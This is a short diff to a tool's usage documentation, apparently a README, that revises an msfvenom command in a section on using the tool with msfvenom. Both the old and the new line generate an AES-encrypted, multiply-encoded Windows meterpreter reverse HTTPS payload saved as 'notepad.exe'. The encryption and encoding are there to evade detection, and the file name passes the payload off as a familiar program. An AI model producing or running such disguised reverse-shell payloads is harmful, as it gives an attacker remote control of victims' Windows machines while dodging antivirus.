@@ -66,7 +66,7 @@ When using with msfvenom, select the **Hex format** and use the values with the 
 
 bash```
 msfvenom -p windows/x64/meterpreter_reverse_https LHOST=YOUR_IP LPORT=YOUR_PORT \
--e aes256 -K YOUR_KEY -i YOUR_IV --encoder x64/xor_dynamic --iterations 5 --arch x64 --platform windows -f exe -o notepad.exe```
+--encryption aes256 --encryption_key YOUR_KEY --encryption_iv YOUR_IV --encoder x64/xor_dynamic --iterations 5 --arch x64 --platform windows -f exe -o notepad.exe --timeout 65```
 
 ## Security Considerations
 
